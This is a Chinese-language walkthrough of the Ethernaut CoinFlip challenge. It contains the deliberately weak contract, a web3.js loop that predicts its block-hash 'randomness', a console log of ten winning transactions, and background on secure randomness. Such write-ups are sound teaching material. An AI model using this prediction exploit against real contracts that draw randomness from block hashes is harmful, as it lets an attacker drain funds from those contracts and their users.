# 04_CoinFlip

# 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

目标: 连续猜中硬币正反面10次.

`flip`函数中使用了区块链中前一个块的块哈希来除以一个确定的数并判断得数, 看上去很随机, 实际上完全不是, 攻击者者很容易模拟出这个"随机数"

```js
let n = await web3.eth.getBlockNumber();
let b = await web3.eth.getBlock(n);
let h = b.hash;
let g = (h / 57896044618658097711785492504343953926634992332820282019728792003956564819968)>1;
await contract.flip(g);

(await contract.consecutiveWins()).toString()
```



## 参考答案

```
^^.js:45 ✌(◕‿-)✌ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 15:52:26.891
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x1615a2033c27c944120d63d14c5cc9bbdf8f2d8eb836c05d8dd1640ade7c6c9d
^^.js:35 => 实例地址0xF8E42a5aCb218e3aa4cDb73C07ED1e52c4913e8b
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 15:52:32.842
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x1615a2033c27c944120d63d14c5cc9bbdf8f2d8eb836c05d8dd1640ade7c6c9d
redux-logger.js:1  action SET_BLOCK_NUM @ 15:52:40.108
for (let index = 0; index < 10; index++) {
	let n = await web3.eth.getBlockNumber();
	let b = await web3.eth.getBlock(n);
	let h = b.hash;
	let g = (h / 57896044618658097711785492504343953926634992332820282019728792003956564819968)>1;
	await contract.flip(g);
	
	(await contract.consecutiveWins()).toString()
}
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0b35c4aae0d379d3daf54f283194c47717a4376ea45a1e69b3475c6c8fb25294
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0b35c4aae0d379d3daf54f283194c47717a4376ea45a1e69b3475c6c8fb25294
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x90d7b4abed30cf4713c16677be9015d19e809660049d6a390269106c9936210e
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x90d7b4abed30cf4713c16677be9015d19e809660049d6a390269106c9936210e
redux-logger.js:1  action SET_BLOCK_NUM @ 15:57:30.150
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xf1c06471e67ade789b4915043482984bb467383c2f7bb2e945346bf48a1734cc
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xf1c06471e67ade789b4915043482984bb467383c2f7bb2e945346bf48a1734cc
redux-logger.js:1  action SET_BLOCK_NUM @ 15:57:40.111
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x92339d96789636dac1355f58ee70a94c214d9cf4d539b4e2084874d97332f7bf
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x92339d96789636dac1355f58ee70a94c214d9cf4d539b4e2084874d97332f7bf
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xc7eb776a746f4dfc9d66275d883fd463551406ffbd9a4a7364fb740239411140
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xc7eb776a746f4dfc9d66275d883fd463551406ffbd9a4a7364fb740239411140
redux-logger.js:1  action SET_BLOCK_NUM @ 15:57:51.224
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x32d6ed83b32baaf98814b29b41e00ce690ea3f3079c7f861bad7d70eee4ce216
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x32d6ed83b32baaf98814b29b41e00ce690ea3f3079c7f861bad7d70eee4ce216
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0ddd116828c76c2089d17bf4bcc69ae940935416523b565c34200d0b21ce02e7
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0ddd116828c76c2089d17bf4bcc69ae940935416523b565c34200d0b21ce02e7
redux-logger.js:1  action SET_BLOCK_NUM @ 15:58:01.274
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xd71fcfa78a1fb67399d4d7e18bf9bf21fa7da91b01b221e275fac4fc6910b4ea
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xd71fcfa78a1fb67399d4d7e18bf9bf21fa7da91b01b221e275fac4fc6910b4ea
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xeece1761e249f95757d7669c5cff7af07c5cc7567a64c88c3fe52ade4a781a0e
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xeece1761e249f95757d7669c5cff7af07c5cc7567a64c88c3fe52ade4a781a0e
redux-logger.js:1  action SET_BLOCK_NUM @ 15:58:11.106
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x26d7b0421b37007d5e9bac8d3ae4750777a5cb8c7d65840958477f7d56a3adfc
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x26d7b0421b37007d5e9bac8d3ae4750777a5cb8c7d65840958477f7d56a3adfc
"10"
redux-logger.js:1  action SET_BLOCK_NUM @ 15:58:20.113
^^.js:45 |[●▪▪●]| 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 15:59:27.801
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xb5b6245c68e7c369911251a64b06371fcaa9ce888cba4d24fb0c1873f747b60c
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xb5b6245c68e7c369911251a64b06371fcaa9ce888cba4d24fb0c1873f747b60c
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:73 ^⨀ᴥ⨀^ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:00:00.120

```

注:会连续弹出10次MetaMask确认窗口





## 知识点

**Solidity中的随机数:**

通过solidity产生随机数没有那么容易. 目前没有一个很自然的方法来做到这一点, 而且你在智能合约中做的所有事情都是公开可见的, 包括本地变量和被标记为私有的状态变量. 矿工可以控制 blockhashes, 时间戳, 或是是否包括某个交易, 这可以让他们根据他们目的来左右这些事情.

想要获得密码学上的随机数,你可以使用 [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.

一些其它的选项包括使用比特币block headers (通过验证 [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), 或是 [Oraclize](http://www.oraclize.it/)).